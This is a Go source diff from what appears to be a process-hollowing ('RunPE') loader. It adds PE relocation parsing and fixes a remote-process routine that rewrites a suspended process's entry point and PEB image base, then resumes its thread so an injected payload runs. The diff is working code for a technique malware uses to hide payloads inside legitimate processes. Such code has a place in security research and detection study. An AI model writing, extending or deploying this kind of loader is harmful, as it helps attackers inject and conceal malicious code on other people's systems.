@@ -238,6 +238,150 @@ func gHasRelocations(peBuffer uintptr) bool {
 	return true
 }
 
+//ApplyRelocCallback struct
+type ApplyRelocCallback struct {
+	is64bit bool
+	oldBase uintptr
+	newBase uintptr
+}
+
+func (a *ApplyRelocCallback) processRelocField(relocField uintptr) bool {
+	if a.is64bit {
+		relocateAddr := (*uintptr)(unsafe.Pointer(relocField))
+		rva := *relocateAddr - a.oldBase
+		*relocateAddr = rva + a.newBase
+	} else {
+		relocateAddr := (*uint32)(unsafe.Pointer(relocField))
+		rva := uintptr(*relocateAddr) - a.oldBase
+		*relocateAddr = uint32(rva + a.newBase)
+	}
+	return true
+}
+
+//gApplyRelocations func
+func gApplyRelocations(
+	modulePtr uintptr, moduleSize uint64, newBase, oldBase uintptr,
+) bool {
+	is64b := gIs64Bit(modulePtr)
+	callback := ApplyRelocCallback{is64b, oldBase, newBase}
+	return ProcessRelocationTable(modulePtr, moduleSize, &callback)
+}
+
+//ProcessRelocBlock func
+func ProcessRelocBlock(
+	block *BASE_RELOCATION_ENTRY,
+	entriesNum uint64,
+	page uint32,
+	modulePtr uintptr,
+	moduleSize uint64,
+	is64bit bool,
+	callback *ApplyRelocCallback,
+) bool {
+	entry := block
+	var i uint64
+	for i = 0; i < entriesNum; i++ {
+		if !gValidatePtr(
+			modulePtr,
+			moduleSize,
+			uintptr(unsafe.Pointer(entry)),
+			uint64(unsafe.Sizeof(BASE_RELOCATION_ENTRY{})),
+		) {
+			break
+		}
+		offset := uint32(entry.Offset)
+		eType := uint32(entry.Type)
+
+		if eType == 0 {
+			break
+		}
+
+		if eType != RELOC_32BIT_FIELD && eType != RELOC_64BIT_FIELD {
+			if callback != nil { //print debug messages only if the callback function was set
+				log.Printf("[-] Not supported relocations format at %d: %d\n", i, eType)
+			}
+			return false
+		}
+
+		relocField := page + offset
+		if relocField >= uint32(moduleSize) {
+			if callback != nil { //print debug messages only if the callback function was set
+				log.Printf("[-] Malformed field: %lx\n", relocField)
+			}
+			return false
+		}
+		if callback != nil {
+			isOK := callback.processRelocField(modulePtr + uintptr(relocField))
+			if !isOK {
+				log.Println("[-] Failed processing reloc field at: \n", relocField)
+				return false
+			}
+		}
+		entry = (*BASE_RELOCATION_ENTRY)(unsafe.Pointer(uintptr(unsafe.Pointer(entry)) + unsafe.Sizeof(*new(uint16))))
+	}
+	return true
+}
+
+//ProcessRelocationTable func
+func ProcessRelocationTable(
+	modulePtr uintptr, moduleSize uint64, callback *ApplyRelocCallback,
+) bool {
+	relocDir := GetDirectoryEntry(modulePtr, IMAGE_DIRECTORY_ENTRY_BASERELOC, false)
+	if relocDir == nil {
+		log.Println("[!] WARNING: no relocation table found!")
+		return false
+	}
+	if !gValidatePtr(
+		modulePtr,
+		moduleSize,
+		uintptr(unsafe.Pointer(relocDir)),
+		uint64(unsafe.Sizeof(pe.DataDirectory{}))) {
+		return false
+	}
+	maxSize := relocDir.Size
+	relocAddr := relocDir.VirtualAddress
+	is64b := gIs64Bit(modulePtr)
+
+	var reloc *IMAGE_BASE_RELOCATION
+
+	var parsedSize uint32
+	for parsedSize < maxSize {
+		reloc = (*IMAGE_BASE_RELOCATION)(unsafe.Pointer(uintptr(relocAddr+parsedSize) + modulePtr))
+		if !gValidatePtr(
+			modulePtr,
+			moduleSize,
+			uintptr(unsafe.Pointer(reloc)),
+			uint64(unsafe.Sizeof(IMAGE_BASE_RELOCATION{})),
+		) {
+			log.Println("[-] Invalid address of relocations")
+			return false
+		}
+		parsedSize += reloc.SizeOfBlock
+
+		if reloc.SizeOfBlock == 0 {
+			break
+		}
+
+		var entriesNum uint64 = uint64((uintptr(reloc.SizeOfBlock) - 2*unsafe.Sizeof(*new(uint32))) / unsafe.Sizeof(*new(uint16)))
+		page := reloc.VirtualAddress
+
+		block := (*BASE_RELOCATION_ENTRY)(unsafe.Pointer(uintptr(unsafe.Pointer(reloc)) + unsafe.Sizeof(*new(uint32))*2))
+		if !gValidatePtr(
+			modulePtr,
+			moduleSize,
+			uintptr(unsafe.Pointer(block)),
+			uint64(unsafe.Sizeof(BASE_RELOCATION_ENTRY{})),
+		) {
+			log.Println("[-] Invalid address of relocations block")
+			return false
+		}
+		if ProcessRelocBlock(
+			block, entriesNum, page, modulePtr, moduleSize, is64b, callback) == false {
+			return false
+		}
+	}
+	return parsedSize != 0
+}
+
 //gRelocateModule func
 func gRelocateModule(
 	modulePtr uintptr, moduleSize uint64, newBase, oldBase uintptr) bool {
@@ -253,7 +397,7 @@ func gRelocateModule(
 		log.Println("Nothing to relocate! oldBase is the same as the newBase!")
 		return true //nothing to relocate
 	}
-	if ApplyRelocations(modulePtr, moduleSize, newBase, oldBase) {
+	if gApplyRelocations(modulePtr, moduleSize, newBase, oldBase) {
 		return true
 	}
 	log.Println("Could not relocate the module!")
@@ -848,17 +992,17 @@ func gRedirectToPayload(
 	loadedPE uintptr, loadBase uintptr, pi *syscall.ProcessInformation, is32bit bool,
 ) bool {
 	//1. Calculate VA of the payload's EntryPoint
-	ep := GetEntryPointRVA(loadedPE)
+	ep := gGetEntryPointRVA(loadedPE)
 	epVA := loadBase + uintptr(ep)
 	log.Printf("EP in GO: %#x\n", ep)
 	log.Printf("EPVA in GO: %#x\n", epVA)
 	//2. Write the new Entry Point into context of the remote process:
-	if UpdateRemoteEntryPoint(pi, epVA, is32bit) == false {
+	if gUpdateRemoteEntryPoint(pi, epVA, is32bit) == false {
 		log.Println("Cannot update remote EP!")
 		return false
 	}
 	//3. Get access to the remote PEB:
-	remotePebAddr := GetRemotePebAddr(pi, is32bit)
+	remotePebAddr := gGetRemotePebAddr(pi, is32bit)
 	if remotePebAddr == 0 {
 		log.Println("Failed getting remote PEB address!")
 		return false
@@ -879,7 +1023,7 @@ func gRedirectToPayload(
 		uint64(unsafe.Sizeof(*new(uintptr))))
 	//4. Write the payload's ImageBase into remote process' PEB:
 	err := WriteProcessMemory(
-		pi.Process, remoteImgBase, loadBase, imgBaseSize)
+		pi.Process, remoteImgBase, uintptr(unsafe.Pointer(&loadBase)), imgBaseSize)
 	if err != nil {
 		log.Println("Error WriteProcessMemory: ", err.Error())
 		return false
@@ -927,6 +1071,7 @@ func gRunPE2(
 		log.Println("Redirecting failed!")
 		return false
 	}
+
 	//6. Resume the thread and let the payload run:
 	ResumeThread(pi.Thread)
 	return true
